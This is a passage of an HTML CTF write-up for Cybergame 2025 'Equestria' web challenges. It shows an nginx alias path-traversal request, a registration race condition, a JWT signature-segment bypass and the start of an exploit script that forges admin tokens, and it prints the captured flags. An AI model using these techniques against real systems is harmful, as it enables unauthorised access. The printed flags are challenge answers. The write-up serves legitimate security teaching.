@@ -1,0 +1,904 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
+<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/ctf/writeup6/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content="CYBERGAME-2025 {WEB-PENTESTING & BINARY-EXPLOITATION}"><meta property="og:description" content=" Kenyan version organized by: Ministry of Information,Communications and the Digital Economy* "><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-06-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content="CYBERGAME-2025 {WEB-PENTESTING & BINARY-EXPLOITATION}"><meta name=twitter:description content=" Kenyan version organized by: Ministry of Information,Communications and the Digital Economy* "><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="hacking articles,hacking articles blog,hacking articles tutorials,hacking articles writeups,ethical hacking articles,cybersecurity articles,security hacking articles,penetration testing articles,infosec articles,cyber security hacking articles,cybersecurity,ethical hacking,CTF writeups,penetration testing,security research,bug bounty,offensive security,infosec,hackthebox,web exploitation,havoc,Richie havoc,htb,learn ethical hacking,hacking tutorials for beginners,cybersecurity tutorials,how to hack ethically,penetration testing course,security researcher blog,hacking step by step guide,ethical hacking examples,real world hacking scenarios,practical hacking exercises,Hercules,Soulmate,Darkcorp,Darkzero,Writeup,Bugbounty,htb writeups,hackthebox walkthrough,hackthebox solutions,penetration testing tutorials,linux privilege escalation,windows privilege escalation,active directory hacking,OSCP preparation,cyber security blog,vulnerability research,exploit development,reverse engineering,binary exploitation,pwn challenges,web security,network security,cryptography challenges,tryhackme,offsec labs,BoardLight HTB,Instant HTB,Sea HTB,Cicada HTB,Intuition HTB,Sightless HTB,Editorial HTB,Runner HTB,Greenhorn HTB,Blazorized HTB,Surveillance HTB,Headless HTB,Crafty HTB,Bizness HTB,Mist HTB,Usage HTB,Perfection HTB,Builder HTB,WifineticTwo HTB,Cap HTB,Analysis HTB,Keeper HTB,ctf challenges,capture the flag,cyber defense,red team operations,blue team defense,malware analysis,forensics challenges,steganography,OSINT techniques,kali linux tutorials,metasploit framework,burp suite tutorials,nmap scanning,sql injection,xss exploitation,privilege escalation techniques,buffer overflow,rop chain,shellcode development,reverse shell,web shell,docker security,kubernetes pentesting,cloud security,aws security,azure pentesting,api security testing,jwt exploitation,owasp top 10,security certifications,CEH preparation,OSWE preparation,OSCE preparation,NanoCorp HTB,NanoCorp walkthrough,NanoCorp writeup,NanoCorp HTB writeup,HTB NanoCorp exploitation,HTB NanoCorp solution,HackTheBox NanoCorp,NTLM relay attacks,NTLM relay exploitation,responder NTLM relay,ntlmrelayx tutorial,windows active directory exploitation,windows privilege escalation techniques,windows enumeration techniques,SMB relay attacks,credential discovery techniques,hard difficulty HTB machines,advanced windows hacking,active directory pentesting guide,windows security assessment,windows post exploitation,domain controller exploitation,kerberos attacks,pass the hash,lateral movement techniques,bloodhound enumeration,impacket tools,windows pentesting,HTB hard machines 2025,HTB season 9 machines,advanced AD attacks,HTB NanoCorp writeup,HTB NanoCorp Machine writeup,nanocorp.htb,CVE-2025-24071,HTB NanoCorp exploitation,DCOM exploitation,Windows DCOM attacks,DACL Abuse,best hacking articles website,top cybersecurity writeup blogs,where to find CTF writeups,detailed penetration testing tutorials,comprehensive hacking guides,step by step hacking tutorials,beginner to advanced ethical hacking,free hacking learning resources,cybersecurity blog 2025,latest hacking techniques,modern exploitation methods,practical security research,how to solve CTF challenges,how to hack hackthebox machines,privilege escalation methods explained,web application security testing,how to find vulnerabilities,penetration testing methodology,OSCP exam preparation tips,HTB machine walkthrough,CTF challenge solutions,security assessment guide,metasploit tutorials,burp suite guides,nmap cheat sheet,gobuster usage,hydra brute force,sqlmap injection,netcat reverse shell,wireshark packet analysis,john the ripper tutorial,hashcat cracking guide,OSCP certification preparation,CEH study materials,bug bounty hunter tips,cybersecurity career guide,penetration tester roadmap,ethical hacker certification,security researcher career path,infosec job preparation,2025 hacking tutorials,latest CVE exploits,zero day vulnerabilities,current cybersecurity threats,modern web exploitation,cloud security testing,API security vulnerabilities,container security hacking,AI security research,machine learning vulnerabilities,alternative to ippsec,similar to hackingarticles,best ctf writeup sites,top penetration testing blogs,ethical hacking resources,cybersecurity learning platforms,hacking practice labs,hacking community,infosec community blog,cybersecurity forum,ethical hacking discord,CTF community,bug bounty community,security researchers network"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/ctf/writeup6/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/ctf/writeup6/"><meta property="og:title" content="CYBERGAME-2025 {WEB-PENTESTING & BINARY-EXPLOITATION}"><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-06-10T00:00:00Z"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="article:author" content="Richie-Havoc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/ctf/writeup6/"><meta name=twitter:title content="CYBERGAME-2025 {WEB-PENTESTING & BINARY-EXPLOITATION}"><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="ctf"><meta name=article:subtitle content="⚡ Web pentesting is quite cool if you know how to do it.⚡"><meta name=article:summary content="* Kenyan version organized by: Ministry of Information,Communications and the Digital Economy*"><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content="CYBERGAME-2025 {WEB-PENTESTING & BINARY-EXPLOITATION}"><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Ctf","item":"https:\/\/havocsec.me\/ctf/"},{"@type":"ListItem","position":3,"name":"CYBERGAME-2025 {WEB-PENTESTING \u0026 BINARY-EXPLOITATION}","item":"https:\/\/havocsec.me\/ctf\/writeup6\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
+<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
+</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
+</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
+</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
+</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
+</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
+<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
+<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
+</button>
+<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
+</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
+</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
+</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
+</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
+</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">CYBERGAME-2025 {WEB-PENTESTING & BINARY-EXPLOITATION}
+     </h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">⚡ Web pentesting is quite cool if you know how to do it.⚡</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Jun 10, 2025 - 21 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/cybergame_huafc7507f212e0984589b262f3614c387_367116_filter_11492400015018413633.webp alt="feature image" height=340 width=736>
+<span class="mb-4 mt-1 text-center text-sm text-slate-700 dark:text-slate-200">cybergame</span></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><h1 id=-equestria>[★★☆] Equestria</h1><h2 id=door-to-the-stable>Door To The Stable</h2><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/doortothestable.png?raw=true" alt=web></p><p><code>nginx.conf</code></p><pre tabindex=0><code>events {
+    worker_connections 1024;
+}
+
+http {
+    include mime.types;
+
+    server {
+        listen 80;
+        server_name localhost;
+
+        root /app/src/html/;
+        index index.html;
+
+
+        location /images {
+            alias /app/src/images/;
+            autoindex on;
+        }
+
+        location /ponies/ {
+            alias /app/src/ponies/;
+        }
+
+        location /resources/ {
+            alias /app/src/resources/;
+        }
+
+        location /secretbackend/ {
+            proxy_pass http://secretbackend:3000/;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+        }
+    }
+}
+</code></pre><p><em>Solution</em></p><p>This is an nginx path traversal.</p><pre tabindex=0><code class=language-httpspec data-lang=httpspec>GET /images../secretbackend/index.js HTTP/1.1
+Host: exp.cybergame.sk:7000
+</code></pre><p>so after identifying it it was easy feeding it to the browser and to spot the index.js file with the suspicious string.</p><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/index.js%20file.png?raw=true" alt=princess></p><pre tabindex=0><code>pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}
+</code></pre><h2 id=shadow-realm>Shadow Realm</h2><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/equetria-shadow%20realm.png?raw=true" alt=web></p><p><em>Solution</em></p><p>This is a race condition that can be exploited for 1 second from when a user is registered, while <code>sendEmailToAdministrator</code> is being executed.</p><p>In the sources we can see the developers did not fully finish this functionality:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>sendEmailToAdministrator</span>(<span style=color:#a6e22e>userId</span>, <span style=color:#a6e22e>username</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// TODO: Implement email sending. We&#39;ll just sleep until then.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>sleep</span>(<span style=color:#ae81ff>1000</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`🦄 Dark Council notified about new subject: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>username</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/api/register&#34;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> {<span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span>, <span style=color:#a6e22e>email</span>} <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> {<span style=color:#a6e22e>rows</span>} <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>dbAsync</span>.<span style=color:#a6e22e>query</span>(
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;INSERT INTO users (username, password, email) VALUES ($1, $2, $3) RETURNING id&#34;</span>,
+</span></span><span style=display:flex><span>            [<span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span>, <span style=color:#a6e22e>email</span>]
+</span></span><span style=display:flex><span>        );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>userId</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>rows</span>[<span style=color:#ae81ff>0</span>].<span style=color:#a6e22e>id</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>sendEmailToAdministrator</span>(<span style=color:#a6e22e>userId</span>, <span style=color:#a6e22e>username</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>dbAsync</span>.<span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#34;UPDATE users SET verified = false WHERE id = $1&#34;</span>, [
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>userId</span>,
+</span></span><span style=display:flex><span>        ]);
+</span></span></code></pre></div><p>The race condition happens because the default value of the verified column in the user table is set to <code>true</code> in the database, and it is not specified in the first <code>INSERT</code> query.</p><pre tabindex=0><code>CREATE TABLE IF NOT EXISTS users
+(
+    id       TEXT PRIMARY KEY DEFAULT uuid_generate_v4(),
+    username TEXT UNIQUE,
+    password TEXT,
+    email    TEXT,
+    verified BOOLEAN          DEFAULT true
+);
+</code></pre><p>It is only later set to <code>false</code>, after the sleep of 1 second in <code>sendEmailToAdministrator</code>.</p><p>All that needs to happen is to register an account and login before the <code>users.verified</code> is set to <code>false</code>, then you are in!</p><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/equestria%20race.png?raw=true" alt=web></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;success&#34;</span>: <span style=color:#66d9ef>true</span>,
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;welcome_msg&#34;</span>: <span style=color:#e6db74>&#34;Access granted. The light has no power here. You walk the path of the unseen, where only those who understand the night may tread. Tread carefully, for even the darkness has its watchers… SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght}&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=the-dark-ruler>The Dark Ruler</h2><p>Description</p><p>There seems to be an endpoint that is only accessible by a privileged user. Can you find a way to access it?</p><p>Solution</p><p>This part to the challenge requires a session modification. Once we could log in as a verified user in <code>Shadow Realm</code>, we got access to a properly signed JWT token. But we need to get a privileged user token.</p><p>In the sources we see that we need to get <code>is_d4rk_pr1nc3ss</code> set to true:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/api/secret-note&#34;</span>, <span style=color:#a6e22e>authMiddleware</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>is_d4rk_pr1nc3ss</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>DARK_PRINCESS_SECRET</span>);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>Next we see that the way that <a href=https://github.com/lukaskuzmiak/cybergame.sk-2025-writeups/blob/main/Equestria/Solution/src/jwt.js><code>jwt.js</code></a> processes tokens is flawed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>verifyToken</span>(<span style=color:#a6e22e>token</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>parts</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>token</span>.<span style=color:#a6e22e>split</span>(<span style=color:#e6db74>&#34;.&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>parts</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>) <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>payload</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>1</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>signature</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>parts</span>[<span style=color:#a6e22e>parts</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>expectedSignature</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>crypto</span>
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>createHmac</span>(<span style=color:#e6db74>&#34;sha256&#34;</span>, <span style=color:#a6e22e>JWT_SECRET</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>update</span>(<span style=color:#a6e22e>parts</span>[<span style=color:#a6e22e>parts</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>])
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>digest</span>(<span style=color:#e6db74>&#34;base64&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>signature</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>expectedSignature</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#a6e22e>payload</span>, <span style=color:#e6db74>&#34;base64&#34;</span>).<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The parts of the JWT token are split by <code>.</code> into <code>parts</code>. Notice that the real signature is parsed as <code>parts[parts.length - 1]</code>, which is calculated as <code>parts[parts.length - 2]</code>, but the actual payload processed further is parsed as <code>parts[1]</code>. Basically, the actual payload is not what the signature is calculated on and can be tampered with.</p><p>When we put this all together, our &ldquo;malicious token&rdquo; includes a &ldquo;malicious payload&rdquo; that sets <code>is_d4rk_pr1nc3ss</code> to <code>true</code>; it looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>malicious_token <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>parts[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>malicious_payload_b64<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>parts[<span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>parts[<span style=color:#ae81ff>2</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span></code></pre></div><p>This is all done in <code>exploit.py</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> aiohttp
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> asyncio
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> uuid
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>export HTTP_PROXY=http://127.0.0.1:8080
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>export HTTPS_PROXY=http://127.0.0.1:8080
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Server URL</span>
+</span></span><span style=display:flex><span>BASE_URL <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://exp.cybergame.sk:7000/secretbackend&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Basic auth credentials</span>
+</span></span><span style=display:flex><span>AUTH <span style=color:#f92672>=</span> aiohttp<span style=color:#f92672>.</span>BasicAuth(<span style=color:#e6db74>&#34;pr1ncess&#34;</span>, <span style=color:#e6db74>&#34;SK-CERT</span><span style=color:#e6db74>{0ff_by_4_s1ngle_sl4sh_f836a8b1}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>register_and_login</span>(session):
+</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;hacker_</span><span style=color:#e6db74>{</span>uuid<span style=color:#f92672>.</span>uuid4()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;hacker&#34;</span>
+</span></span><span style=display:flex><span>    email <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;hacker@hacker.hacker&#39;</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;username&#34;</span>: username,
